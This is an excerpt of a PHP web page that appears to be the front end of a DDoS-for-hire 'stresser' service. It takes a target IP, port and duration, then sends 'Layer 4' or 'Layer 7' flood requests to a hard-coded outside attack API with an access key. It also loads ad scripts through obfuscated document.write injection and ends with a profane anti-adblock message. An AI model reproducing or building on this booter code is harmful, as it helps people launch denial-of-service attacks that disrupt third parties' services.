...
<?php
    ...
    try {
        $dbh = new PDO("mysql:host=localhost;dbname=quarentena", "root", "");
...
<script type='text/javascript' src='//euizhltcd6ih.com/37/72/54/3772547ee585310c9f3bf6f8b6ff2ce5.js'></script>
                                ...
                                <div class="card">
                                    <div class="card-body" style="text-align: center">
                                        <div class="btn-group" role="group" aria-label="Basic example">
                                            <button type="button" id="layer4" class="btn btn-secondary">Layer 4</button>
                                            <button type="button" id="layer7" class="btn btn-secondary">Layer 7</button>
                                        </div>
                                      </div>
                                    <div class="card-body">
                                        ...
                                        <form method="POST">
                                            <?php
                                                ...
                                                if(isset($_POST["g-recaptcha-response"]) && is_numeric($_POST["port"]) && is_numeric($_POST["time"]) && filter_var($ip, FILTER_VALIDATE_IP)) {
                                                    ...
                                                    if($_POST["time"] > 50 || $_POST["time"] <= 0) {
                                                        echo '<script>alert("Time should be a number between 1 and 50.");</script>';
                                                    } else {
                                                        ...
                                                        if($responseKeys["success"]) {
                                                            ...
                                                            if((strtotime($actual_date) - strtotime($mysql_content["timestamp"])) < intval($mysql_content["time"])) {
                                                                ...
                                                                if($_POST["method"] == "layer4"){
                                                                    ...
                                                                    $api = "http://165.227.139.92/api.php?key=wowepico&host=" . $ip . "&port=" . $port . "&time=" . $time . "&method=layer4";
                                                                    ...
                                                                    $api = "http://165.227.139.92/api.php?key=wowepico&host=" . $ip . "&time=" . $time . "&method=layer7";
	...
	atOptions = {
		'key' : 'a55a494a28681d35d32e75693325944d',
		'format' : 'iframe',
		'height' : 300,
		'width' : 160,
		'params' : {}
	};
	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://euizhltcd6ih.com/a55a494a28681d35d32e75693325944d/invoke.js"></scr' + 'ipt>');
</script></center>
                </div>
                <!-- End Page-content -->
...
if(document.getElementById('dhneragranpyho')){
 
} else {
  document.getElementById("gay").innerHTML = 'Mano...' 
   document.write('<center><h1>Fuck off , desliga o ADBLOCK se queres usar isto.</h1></center>'); 
    document.close(); 
    }
